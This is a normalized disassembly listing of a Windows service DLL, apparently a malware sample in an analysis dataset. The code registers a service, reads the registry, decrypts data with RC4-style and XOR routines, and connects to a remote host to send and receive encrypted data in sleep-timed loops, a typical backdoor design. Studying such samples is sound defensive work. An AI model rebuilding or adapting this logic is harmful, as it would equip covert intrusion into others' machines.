sub_180001000
push rdi
sub rsp 0x3f0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x3e0 ] rax
xor edi edi
cmp edx 0x1
jne r-xdata
test edx edx
jne r-xdata
mov [ rsp + 0x408 ] rbx
mov [ rw-data ] rcx
call [ DisableThreadLibraryCalls@IAT ]
lea rcx [ rsp + 0x32 ]
xor edx edx
mov r8d 0x196
mov [ rsp + 0x30 ] di
call sub_180009540
lea rdx [ rsp + 0x30 ]
mov ecx 0x202
call [ WSAStartup@IAT ]
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ rsp + 0x1d2 ]
xor edx edx
mov r8d 0x206
mov [ rsp + 0x1d0 ] di
mov rbx rax
call sub_180009540
call [ GetCurrentProcess@IAT ]
mov rdx [ rw-data ]
lea r8 [ rsp + 0x1d0 ]
mov rcx rax
mov r9d 0x104
call rbx
lea r8 [ rsp + 0x1d0 ]
lea rcx [ rw-data ]
mov edx 0x3a8
call sub_1800026e0
lea rcx [ rw-data ]
call [ InitializeCriticalSection@IAT ]
mov rbx [ rsp + 0x408 ]
cmp [ rw-data ] rdi
jne r-xdata
mov eax edi
cmp [ rw-data ] rdi
je r-xdata
mov eax 0x1
lea rcx [ r--data ]
xchg [ rw-data ] eax
call [ GetModuleHandleA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea r8 [ sub_1800013b0 ]
xor r9d r9d
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x20 ] edi
call rax
mov [ rw-data ] rax
lea eax [ rdi + 0x1 ]
jmp r-xdata
lea rcx [ rw-data ]
call [ DeleteCriticalSection@IAT ]
call [ WSACleanup@IAT ]
lea rcx [ r--data ]
call [ OutputDebugStringA@IAT ]
mov eax 0x1
jmp r-xdata
xchg [ rw-data ] edi
cmp [ rw-data ] edx
je r-xdata
mov rcx [ rsp + 0x3e0 ]
xor rcx rsp
call sub_1800042d0
add rsp 0x3f0
pop rdi
retn
mov rcx [ rw-data ]
mov edx 0xff
call [ TerminateThread@IAT ]
mov rcx [ rw-data ]
call [ CloseHandle@IAT ]
nop [ rax ] eax
lea rcx [ r--data ]
call [ OutputDebugStringA@IAT ]
mov ecx 0x64
call [ Sleep@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
sub_180001200
sub rsp 0x38
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
add rsp 0x38
retn
mov eax 0x1
lea rcx [ r--data ]
xchg [ rw-data ] eax
call [ GetModuleHandleA@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
xor ecx ecx
lea r8 [ sub_1800013b0 ]
mov [ rsp + 0x28 ] rcx
xor r9d r9d
xor edx edx
mov [ rsp + 0x20 ] ecx
call rax
mov [ rw-data ] rax
mov eax 0x1
add rsp 0x38
retn
sub_180001270
cmp ecx 0x1
je r-xdata
xor eax eax
mov [ rw-data ] 0x1
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp ecx 0x5
jne r-xdata
mov rcx [ rw-data ]
lea rdx [ rw-data ]
jmp [ SetServiceStatus@IAT ]
StartMain
push rbx
sub rsp 0x20
xor ebx ebx
lea rdx [ sub_180001270 ]
lea rcx [ rw-data ]
mov [ rw-data ] 0x120
mov [ rw-data ] 0x2
mov [ rw-data ] 0x5
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call [ RegisterServiceCtrlHandlerA@IAT ]
mov [ rw-data ] rax
test rax rax
je r-xdata
add rsp 0x20
pop rbx
retn
lea rdx [ rw-data ]
mov rcx rax
mov [ rw-data ] 0x120
mov [ rw-data ] 0x4
mov [ rw-data ] 0x5
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call [ SetServiceStatus@IAT ]
test eax eax
je r-xdata
mov rcx [ rw-data ]
call sub_180001200
mov r11d [ rw-data ]
cmp r11d 0x3
je r-xdata
cmp r11d 0x1
je r-xdata
mov ecx 0x1f4
call [ Sleep@IAT ]
mov r11d [ rw-data ]
cmp r11d 0x3
jne r-xdata
sub_1800013b0
mov rax rsp
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x740
mov [ rsp + 0xd8 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x730 ] rax
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
mov rcx rax
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov rdi rax
xor esi esi
mov [ rsp + 0x520 ] si
xor edx edx
mov r8d 0x206
lea rcx [ rsp + 0x522 ]
call sub_180009540
call [ GetCurrentProcess@IAT ]
mov rcx rax
mov r9d 0x104
lea r8 [ rsp + 0x520 ]
mov rdx [ rw-data ]
call rdi
mov [ rsp + 0x68 ] esi
mov [ rsp + 0x70 ] rsi
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x60 ] rsi
mov [ rw-data ] 0xffffffffffffffff
lea rax [ rsp + 0x520 ]
mov [ rw-data ] rax
lea rax [ rw-data ]
mov [ rw-data ] rax
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
mov rdi rax
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov rbx rax
lea rdx [ r--data ]
mov rcx rdi
call [ GetProcAddress@IAT ]
mov rbp rax
mov [ rsp + 0x80 ] rax
lea rdx [ r--data ]
mov rcx rdi
call [ GetProcAddress@IAT ]
mov r15 rax
mov [ rsp + 0x90 ] rax
lea rdx [ r--data ]
mov rcx rdi
call [ GetProcAddress@IAT ]
mov [ rsp + 0xd0 ] rax
lea rdx [ r--data ]
mov rcx rdi
call [ GetProcAddress@IAT ]
mov [ rsp + 0x88 ] rax
mov [ rsp + 0x78 ] 0x3
mov [ rsp + 0x38 ] rsi
lea rax [ rsp + 0x38 ]
mov [ rsp + 0x20 ] rax
mov r9d 0xf003f
xor r8d r8d
lea rdx [ r--data ]
mov rcx 0xffffffff80000002
call rbx
cmp [ rw-data ] esi
je r-xdata
mov rcx [ rsp + 0x38 ]
test rcx rcx
je r-xdata
lea ecx [ rsi + 0x1 ]
nop [ rax ] eax
cmp [ rsp + 0x68 ] 0x0
je r-xdata
call rbp
nop
mov edi 0x1
jmp r-xdata
mov [ rsp + 0x30 ] 0x3fffc
mov ecx 0x3fffc
call sub_180004454
mov rbp rax
test rax rax
je r-xdata
or eax 0xffffffff
mov rax [ rsp + 0x70 ]
test rax rax
je r-xdata
test r12d r12d
je r-xdata
mov edi 0x1
mov edi esi
nop [ rax + rax ] eax
mov rcx [ rsp + 0x48 ]
test rcx rcx
je r-xdata
xor r8d r8d
xor edx edx
mov rcx [ rsp + 0x48 ]
call rax
test r14 r14
je r-xdata
mov r15d 0x1
test eax eax
jne r-xdata
mov eax [ rsp + 0x30 ]
add eax 0xffff
mov [ rsp + 0x30 ] eax
mov edx eax
mov rcx rbp
call sub_18000450c
mov rbp rax
inc edi
cmp edi 0x40
jb r-xdata
mov [ rsp + 0x68 ] esi
mov [ rsp + 0x70 ] rsi
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x60 ] rsi
xor edx edx
mov r8d 0x8000
call [ VirtualFree@IAT ]
mov rcx r14
call sub_180004690
mov ecx 0xea60
call [ Sleep@IAT ]
lea r9 [ rw-data ]
mov r8d r13d
mov rdx r14
lea rcx [ rsp + 0x48 ]
call sub_180003290
test eax eax
je r-xdata
mov ecx [ rsp + 0x40 ]
test ecx ecx
je r-xdata
mov ecx 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
mov rcx rbp
call sub_180004690
mov [ rsp + 0x30 ] esi
mov edi 0x1
mov r12d edi
jmp r-xdata
mov [ rsp + 0x300 ] bl
xor edx edx
mov r8d 0x103
lea rcx [ rsp + 0x301 ]
call sub_180009540
mov r9d [ rw-data ]
xor r9d 0x12
lea r8 [ r--data ]
mov edx 0x104
lea rcx [ rsp + 0x300 ]
call sub_1800045e0
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rsp + 0x300 ]
[ rdi ]
not rcx
dec rcx
mov r8 rcx
cmp rcx 0x1
jb r-xdata
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] rbp
lea r9 [ rsp + 0x78 ]
xor r8d r8d
lea rdx [ r--data ]
mov rcx [ rsp + 0x38 ]
call r15
cmp eax 0xea
jne r-xdata
mov edi 0x1
jmp r-xdata
mov rbp [ rsp + 0x80 ]
mov ecx 0x1
jmp r-xdata
mov eax edi
xchg [ rw-data ] eax
mov ecx 0x64
call [ Sleep@IAT ]
call sub_180003800
test eax eax
jne r-xdata
movzx ecx [ rw-data ]
imul ecx ecx 0xea60
call [ Sleep@IAT ]
jmp r-xdata
movzx eax [ rsp + 0x34 ]
test ax ax
je r-xdata
mov [ rsp + 0x40 ] esi
mov [ rsp + 0x34 ] si
inc ebx
cmp ebx 0x8
cmova ebx r15d
lea r9 [ rsp + 0x34 ]
lea r8 [ rsp + 0x40 ]
mov edx ebx
lea rcx [ rw-data ]
call sub_180003880
test eax eax
jne r-xdata
test rbp rbp
je r-xdata
cmp ecx 0x1
jl r-xdata
mov [ rw-data ] 0xffffffffffffffff
mov [ rw-data ] rsi
mov [ rw-data ] esi
mov [ rw-data ] rsi
mov [ rw-data ] esi
mov r12d ecx
mov ebx esi
mov r14 rsi
mov r13d esi
cmp [ rsp + 0x38 ] rbx
je r-xdata
mov ecx 0xbb8
call [ Sleep@IAT ]
cmp [ rsp + 0x68 ] 0x0
je r-xdata
nop [ rax + rax ] eax
mov [ rsp + 0x98 ] esi
xor edx edx
mov [ rsp + 0xa0 ] rdx
mov [ rsp + 0xa8 ] rdx
mov [ rsp + 0xb0 ] rdx
mov [ rsp + 0xb8 ] rdx
mov [ rsp + 0xc0 ] rdx
mov [ rsp + 0xc8 ] rdx
mov [ rsp + 0xb0 ] 0xffffffffffffffff
mov [ rsp + 0xa8 ] ecx
mov [ rsp + 0xac ] ax
mov [ rsp + 0xb8 ] 0x3
lea rcx [ rsp + 0x98 ]
call sub_180001c70
test eax eax
jne r-xdata
mov r14 rbp
mov r13d [ rsp + 0x30 ]
mov r12d esi
mov edi 0x1
jmp r-xdata
lea r8 [ rsp + 0x1f0 ]
mov edx [ rsp + 0x30 ]
mov rcx rbp
call sub_180002640
mov edx 0x100
cmp ecx edx
cmovg r8d edx
mov eax esi
lea rcx [ rsp + 0x1f0 ]
or edi 0xffffffff
mov edi esi
mov rbx [ rsp + 0x48 ]
mov rax [ rsp + 0x70 ]
test rax rax
je r-xdata
mov ecx 0x1f4
call [ Sleep@IAT ]
call sub_180003800
test eax eax
je r-xdata
mov r14 [ rsp + 0xc0 ]
mov r13d [ rsp + 0xc8 ]
cmp [ rsp + 0x38 ] 0x0
mov r15 [ rsp + 0x90 ]
je r-xdata
movzx ecx [ rw-data ]
imul ecx ecx 0xea60
call [ Sleep@IAT ]
jmp r-xdata
mov [ rcx ] al
inc eax
inc rcx
cmp eax edx
jl r-xdata
mov [ rsp + 0x2f0 ] bl
mov [ rsp + 0x2f1 ] bl
xor r10b r10b
xor r9b r9b
lea rdi [ rsp + 0x1f0 ]
mov r11 rdx
nop [ rax + rax ] eax
mov rcx [ rsp + 0x38 ]
test rcx rcx
je r-xdata
mov rcx [ rsp + 0x38 ]
test rcx rcx
je r-xdata
test rbx rbx
je r-xdata
xor r8d r8d
xor edx edx
mov rcx rbx
call rax
mov edi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edi 0x1
jmp r-xdata
mov rbx r13
mov rcx r13
call sub_180004454
mov rbp rax
test rax rax
je r-xdata
movzx edx [ rdi ]
movzx eax r9b
movzx ecx [ rsp + rax + 0x300 ]
add cl dl
add r10b cl
mov [ rw-data ] dl
movzx ecx r10b
movzx eax [ rsp + rcx + 0x1f0 ]
mov [ rdi ] al
mov [ rsp + rcx + 0x1f0 ] dl
inc r9b
movzx eax r9b
cdq
idiv r8d
mov r9d edx
inc rdi
sub r11 0x1
jne r-xdata
xchg [ rw-data ] esi
mov eax edi
jmp r-xdata
call [ rsp + 0x80 ]
mov eax esi
xchg [ rw-data ] eax
mov ecx 0x2710
call [ Sleep@IAT ]
jmp r-xdata
lea rdx [ r--data ]
mov rdi [ rsp + 0x88 ]
call rdi
lea rdx [ r--data ]
mov rcx [ rsp + 0x38 ]
call rdi
lea rdx [ r--data ]
mov rcx [ rsp + 0x38 ]
call rdi
mov [ rsp + 0x68 ] esi
mov [ rsp + 0x70 ] rsi
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x60 ] rsi
jmp r-xdata
xor edx edx
mov r8d 0x8000
mov rcx rbx
call [ VirtualFree@IAT ]
mov edi 0x1
mov r8 rbx
mov rdx r14
mov rcx rax
call sub_1800059c0
mov [ rsp + 0x410 ] 0x0
xor edx edx
mov r8d 0x103
lea rcx [ rsp + 0x411 ]
call sub_180009540
mov r9d [ rw-data ]
xor r9d 0x12
lea r8 [ r--data ]
mov edx 0x104
lea rcx [ rsp + 0x410 ]
call sub_1800045e0
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rsp + 0x410 ]
[ rdi ]
not rcx
dec rcx
mov rdi rcx
cmp rcx 0x1
jb r-xdata
mov rcx [ rsp + 0x730 ]
xor rcx rsp
call sub_1800042d0
lea r11 [ rsp + 0x740 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
cmp [ rw-data ] 0x0
je r-xdata
mov rcx r14
call sub_180004690
test edi edi
jne r-xdata
cmp r13d 0x1
jl r-xdata
cmp ecx 0x1
jl r-xdata
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] rbp
mov r9d 0x3
xor r8d r8d
lea rdx [ r--data ]
mov rcx [ rsp + 0x38 ]
call [ rsp + 0xd0 ]
mov rcx rbp
call sub_180004690
mov edi 0x1
jmp r-xdata
movzx r9d [ rsp + 0x1e0 ]
movzx r10d [ rsp + 0x1e1 ]
test r13d r13d
jle r-xdata
mov edx 0x100
cmp ecx edx
cmovg edi edx
mov eax esi
lea rcx [ rsp + 0xe0 ]
mov r8 rbp
nop [ rax + rax ] ax
mov [ rcx ] al
inc eax
inc rcx
cmp eax edx
jl r-xdata
mov [ rsp + 0x1e0 ] 0x0
mov [ rsp + 0x1e1 ] 0x0
xor r9b r9b
xor r11b r11b
lea r8 [ rsp + 0xe0 ]
mov r10 rdx
nop [ rax ] eax
inc r9b
movzx edi r9b
movzx edx [ rsp + rdi + 0xe0 ]
add r10b dl
mov [ rw-data ] dl
movzx ecx r10b
movzx eax [ rsp + rcx + 0xe0 ]
mov [ rsp + rdi + 0xe0 ] al
mov [ rsp + rcx + 0xe0 ] dl
movzx ecx [ rsp + rdi + 0xe0 ]
add ecx edx
movzx eax cl
movzx ecx [ rsp + rax + 0xe0 ]
xor [ r8 ] cl
inc r8
sub rbx 0x1
jne r-xdata
movzx edx [ r8 ]
movzx eax r11b
movzx ecx [ rsp + rax + 0x410 ]
add cl dl
add r9b cl
mov [ rw-data ] dl
movzx ecx r9b
movzx eax [ rsp + rcx + 0xe0 ]
mov [ r8 ] al
mov [ rsp + rcx + 0xe0 ] dl
inc r11b
movzx eax r11b
cdq
idiv edi
mov r11d edx
inc r8
sub r10 0x1
jne r-xdata
sub_180001c70
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x440
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x430 ] rax
mov r14 rcx
mov [ rsp + 0x98 ] rcx
lea rsi [ rcx + 0x10 ]
mov [ rsp + 0x38 ] rsi
or rbx 0xffffffffffffffff
mov [ rsp + 0x48 ] rbx
xor r13d r13d
mov r12d r13d
mov [ rsp + 0x30 ] r13d
xor dil dil
mov [ rsp + 0x34 ] dil
lea r15d [ rbx + 0x3 ]
test r13d r13d
jne r-xdata
mov [ rsp + 0x28 ] 0x1
mov [ rsp + 0x20 ] r13d
xor r9d r9d
lea edx [ r9 + 0x1 ]
lea r8d [ r9 + 0x6 ]
mov ecx r15d
call [ WSASocketW@IAT ]
mov rbx rax
mov [ rsp + 0x48 ] rax
cmp rax 0xffffffffffffffff
jne r-xdata
mov [ rsp + 0xb0 ] r13d
xor edx edx
lea r8d [ rdx + 0x4c ]
lea rcx [ rsp + 0xb4 ]
call sub_180009540
lea rcx [ rsp + 0xbc ]
lea rdx [ rw-data ]
mov r8d 0x40
call sub_1800059c0
mov [ rsp + 0xb0 ] 0x1000010
mov eax [ r14 + 0x20 ]
mov [ rsp + 0xb4 ] eax
movzx eax [ rw-data ]
mov [ rsp + 0xb8 ] ax
mov eax [ rw-data ]
shr eax 0x4
and eax 0x1
mov [ rsp + 0xba ] ax
mov [ rsp + 0x210 ] 0x0
xor edx edx
mov r8d 0x103
lea rcx [ rsp + 0x211 ]
call sub_180009540
lea rcx [ rsp + 0x210 ]
lea rdx [ rsp + 0xb0 ]
mov edi 0x50
mov r8 rdi
call sub_1800059c0
mov [ rsp + 0x320 ] 0x0
xor edx edx
mov r8d 0x103
lea rcx [ rsp + 0x321 ]
call sub_180009540
mov r11d r13d
mov [ rsp + 0x6c ] r13d
nop [ rax ] eax
mov r12d 0x1
mov [ rsp + 0x30 ] r12d
jmp r-xdata
mov [ rsp + 0xa0 ] r13w
xor eax eax
mov [ rsp + 0xa2 ] rax
mov [ rsp + 0xaa ] eax
mov [ rsp + 0xae ] ax
mov [ rsp + 0xa0 ] r15w
mov ecx [ rsi ]
call [ htonl@IAT ]
mov [ rsp + 0xa4 ] eax
movzx ecx [ rsi + 0x4 ]
call [ htons@IAT ]
mov [ rsp + 0xa2 ] ax
mov r8d 0x10
lea rdx [ rsp + 0xa0 ]
mov rcx rbx
call [ connect@IAT ]
cmp eax 0xffffffff
jne r-xdata
lea ecx [ rax + 0x65 ]
call [ Sleep@IAT ]
jmp r-xdata
mov [ rsp + 0x60 ] edi
mov esi r13d
mov [ rsp + 0x64 ] r13d
mov ecx r11d
movsx eax [ rsp + rcx + 0x210 ]
xor eax 0x19860527
mov [ rsp + rcx + 0x320 ] al
inc r11d
mov [ rsp + 0x6c ] r11d
jmp r-xdata
test r12d r12d
je r-xdata
mov rcx rbx
call [ closesocket@IAT ]
or rbx 0xffffffffffffffff
mov [ rsp + 0x48 ] rbx
lea ecx [ rbx + 0x65 ]
call [ Sleep@IAT ]
inc dil
mov [ rsp + 0x34 ] dil
jmp r-xdata
cmp esi 0x50
je r-xdata
movsxd rax esi
lea rdx [ rsp + rax + 0x320 ]
xor r9d r9d
mov r8d edi
mov rcx rbx
call [ send@IAT ]
test eax eax
jle r-xdata
cmp r11d edi
jae r-xdata
mov ecx [ rsi ]
mov [ rw-data ] ecx
movzx ecx [ rsi + 0x4 ]
mov [ rw-data ] cx
mov [ rw-data ] rbx
mov [ rsi + 0x8 ] rbx
mov [ rw-data ] r13d
mov [ rw-data ] r13w
mov [ rw-data ] 0xffffffffffffffff
mov [ rsi + 0x8 ] 0xffffffffffffffff
cmp rbx 0xffffffffffffffff
je r-xdata
cmp dil [ rw-data ]
jae r-xdata
mov [ rsp + 0x50 ] r13d
xor eax eax
mov [ rsp + 0x54 ] eax
mov [ rsp + 0x58 ] eax
mov [ rsp + 0x100 ] al
xor edx edx
mov r8d 0x103
lea rcx [ rsp + 0x101 ]
call sub_180009540
or r9d 0xffffffff
lea r8d [ r9 + 0xd ]
lea rdx [ rsp + 0x50 ]
mov rcx rbx
call sub_180003780
test eax eax
jne r-xdata
mov r12d 0x1
mov [ rsp + 0x30 ] r12d
mov rsi [ rsp + 0x38 ]
jmp r-xdata
add esi eax
mov [ rsp + 0x64 ] esi
sub edi eax
mov [ rsp + 0x60 ] edi
jmp r-xdata
test r12d r12d
sete r13b
mov eax r13d
mov rcx [ rsp + 0x430 ]
xor rcx rsp
call sub_1800042d0
lea r11 [ rsp + 0x440 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rcx rbx
call [ closesocket@IAT ]
jmp r-xdata
cmp [ rsp + 0x54 ] 0x1000010
jne r-xdata
mov r12d 0x1
mov [ rsp + 0x30 ] r12d
mov rsi [ rsp + 0x38 ]
jmp r-xdata
test edi edi
jle r-xdata
mov r12d 0x1
mov [ rsp + 0x30 ] r12d
mov rsi [ rsp + 0x38 ]
jmp r-xdata
cmp [ rsp + 0x50 ] 0x1000010
jne r-xdata
or r9d 0xffffffff
lea r8d [ r9 + 0x1d ]
lea rdx [ rsp + 0x100 ]
mov rcx rbx
call sub_180003780
test eax eax
jne r-xdata
mov [ rsp + 0x70 ] r13d
lea rdx [ rsp + 0x70 ]
lea rcx [ rsp + 0x100 ]
mov rax [ rcx ]
mov [ rdx ] rax
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
mov rax [ rcx + 0x10 ]
mov [ rdx + 0x10 ] rax
mov eax [ rcx + 0x18 ]
mov [ rdx + 0x18 ] eax
cmp [ rsp + 0x108 ] 0x0
je r-xdata
mov r12d 0x1
mov [ rsp + 0x30 ] r12d
mov rsi [ rsp + 0x38 ]
jmp r-xdata
mov r12d 0x1
mov [ rsp + 0x30 ] r12d
mov rsi [ rsp + 0x38 ]
jmp r-xdata
mov rax [ rsp + 0x108 ]
shr rax 0x20
test eax eax
je r-xdata
lea ecx [ rax + 0x104 ]
call sub_180004740
mov r15 rax
or r9d 0xffffffff
mov r14d [ rsp + 0x7c ]
mov r8d r14d
mov rdx rax
mov rcx rbx
call sub_180003780
test eax eax
jne r-xdata
mov edi [ rsp + 0x78 ]
lea ecx [ rdi + 0x104 ]
call sub_180004454
mov rsi rax
test rax rax
je r-xdata
mov r12d 0x1
mov [ rsp + 0x30 ] r12d
mov rsi [ rsp + 0x38 ]
jmp r-xdata
mov rsi [ rsp + 0x38 ]
mov r8d r14d
mov rdx r15
mov rcx rax
call sub_1800031d0
mov r11d [ rsp + 0x70 ]
xor r11d 0x19860527
mov [ rsp + 0x70 ] r11d
mov edx r13d
mov [ rsp + 0x68 ] edx
mov rcx rsi
mov [ rsp + 0x90 ] rcx
mov edx r13d
mov [ rsp + 0x40 ] edx
nop [ rax + rax ] eax
mov ecx edx
movsx eax [ rcx + rsi ]
xor eax r11d
mov [ rcx + rsi ] al
inc edx
mov [ rsp + 0x68 ] edx
jmp r-xdata
test edi edi
je r-xdata
movzx eax [ rcx ]
add edx eax
mov [ rsp + 0x40 ] edx
add rcx 0x2
mov [ rsp + 0x90 ] rcx
sub edi 0x2
jmp r-xdata
cmp edx edi
jae r-xdata
mov ecx edx
shr ecx 0x10
movzx eax dx
add ecx eax
mov [ rsp + 0x40 ] ecx
mov eax ecx
shr eax 0x10
add ecx eax
mov [ rsp + 0x40 ] ecx
not cx
cmp [ rsp + 0x74 ] cx
je r-xdata
movzx eax [ rcx ]
add edx eax
mov [ rsp + 0x40 ] edx
cmp edi 0x1
jle r-xdata
mov rax [ rsp + 0x98 ]
mov [ rax + 0x28 ] rsi
mov ecx [ rsp + 0x80 ]
mov [ rax + 0x30 ] ecx
mov edx [ rsp + 0x84 ]
test edx edx
je r-xdata
mov rcx r15
call j_sub_180004690
mov rcx rsi
call j_sub_180004690
mov r12d 0x1
mov [ rsp + 0x30 ] r12d
mov rsi [ rsp + 0x38 ]
jmp r-xdata
mov r8d [ rsp + 0x88 ]
test r8d r8d
je r-xdata
lea rax [ rsi + rcx ]
mov [ rw-data ] rax
mov [ rw-data ] edx
mov rcx r15
call j_sub_180004690
mov rsi [ rsp + 0x38 ]
jmp r-xdata
lea rax [ rsi + rdx ]
add rcx rax
mov [ rw-data ] rcx
mov [ rw-data ] r8d
sub_180002240
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
mov rbx rcx
call sub_180002320
or rcx 0xffffffffffffffff
mov rsi rax
xor eax eax
mov rdi rbx
[ rdi ]
not rcx
dec rcx
shr rcx 0x1
inc rcx
call sub_180004740
or rcx 0xffffffffffffffff
mov rdi rbx
mov rbp rax
xor eax eax
xor edx edx
[ rdi ]
mov [ rsp + 0x50 ] 0x0
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbp
shr r8 0x1
inc r8
call sub_180009540
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ r--data ]
lea r8 [ r--data ]
[ rdi ]
mov rdi rbx
not rcx
lea r9 [ rcx - 0x1 ]
or rcx 0xffffffffffffffff
[ rdi ]
not rcx
lea rax [ rcx - 0x1 ]
mov rcx rsi
cdq
sub eax edx
sar eax 0x1
mov edx eax
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] rbp
call sub_180002490
test eax eax
jne r-xdata
movsxd rax [ rsp + 0x50 ]
mov [ rax + rbp ] 0x0
mov rax rbp
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_180002320
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rbx
[ rdi ]
not rcx
lea eax [ rcx - 0x1 ]
lea rdi [ rcx - 0x1 ]
cdq
sub eax edx
sar eax 0x1
movsxd rsi eax
mov rcx rsi
call sub_180004740
mov r11 rax
test edi edi
jle r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
xor eax eax
add rsp 0x20
pop rdi
retn
mov eax edi
cdq
and eax 0x1
xor eax edx
cmp eax edx
jne r-xdata
xor edi edi
test esi esi
jle r-xdata
mov rax r11
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov r8 r11
mov r9d 0x37
nop [ rax ] eax
movsx eax [ rbx + 0x1 ]
mov ecx 0x30
cmp al 0x41
cmovge ecx r9d
sub eax ecx
cmp eax 0x10
jge r-xdata
shl dl 0x4
inc edi
inc r8
add dl al
add rbx 0x2
cmp edi esi
mov [ r8 - 0x1 ] dl
jl r-xdata
movsx eax [ rbx ]
mov ecx 0x30
cmp al 0x41
mov edx eax
cmovge ecx r9d
sub edx ecx
cmp edx 0x10
jge r-xdata
sub_1800023f0
push rdi
xor r10d r10d
mov edi edx
test r8 r8
je r-xdata
xor eax eax
pop rdi
retn
mov [ rsp + 0x10 ] rbx
mov eax r10d
mov rcx r8
mov [ rsp + 0x18 ] rsi
mov [ rcx ] al
inc eax
inc rcx
cmp eax 0x100
jl r-xdata
mov ebx r10d
mov r11 r8
lea rsi [ r--data ]
nop [ rax + rax ] eax
mov eax ebx
inc ebx
inc r11
cdq
idiv edi
movsxd rax edx
movzx edx [ r11 - 0x1 ]
movzx ecx [ rax + rsi ]
lea eax [ r10 + rcx ]
add eax edx
cdq
movzx edx dl
add eax edx
movzx eax al
sub eax edx
cmp ebx 0x100
movzx edx [ r11 - 0x1 ]
movsxd r10 eax
movzx ecx [ r10 + r8 ]
mov [ r11 - 0x1 ] cl
mov [ r10 + r8 ] dl
jl r-xdata
mov rsi [ rsp + 0x18 ]
mov rbx [ rsp + 0x10 ]
or eax 0xffffffff
pop rdi
retn
sub_180002490
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
mov rbp rcx
mov ecx 0x100
mov ebx r9d
movsxd rsi edx
call sub_180004740
lea rcx [ r--data ]
xor r12d r12d
mov edx ebx
mov r8 rax
mov rdi rax
mov r13d r12d
call sub_1800023f0
test eax eax
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
mov r10 rsi
test esi esi
jle r-xdata
mov rcx rdi
call j_sub_180004690
mov r11 [ rsp + 0x68 ]
mov eax esi
mov [ r11 ] esi
mov r11 [ rsp + 0x60 ]
sub rbp r11
nop [ rax ] eax
lea eax [ r12 + 0x1 ]
inc r11
cdq
movzx edx dl
add eax edx
movzx eax al
sub eax edx
movsxd r12 eax
movzx eax [ r12 + rdi ]
add eax r13d
cdq
movzx edx dl
add eax edx
movzx eax al
sub eax edx
movzx edx [ r12 + rdi ]
movsxd r13 eax
movzx ecx [ r13 + rdi ]
mov [ r12 + rdi ] cl
mov [ r13 + rdi ] dl
movzx eax [ r12 + rdi ]
movzx ecx dl
add eax ecx
cdq
movzx edx dl
add eax edx
movzx eax al
sub eax edx
movsxd rcx eax
movzx eax [ rcx + rdi ]
xor al [ r11 + rbp - 0x1 ]
sub r10 0x1
mov [ r11 - 0x1 ] al
jne r-xdata
sub_180002590
push rsi
cmp edx 0x1
mov r9 r8
mov r10d edx
mov rsi rcx
jge r-xdata
mov r8d 0x100
mov [ rsp + 0x10 ] rbx
mov rcx r9
cmp edx r8d
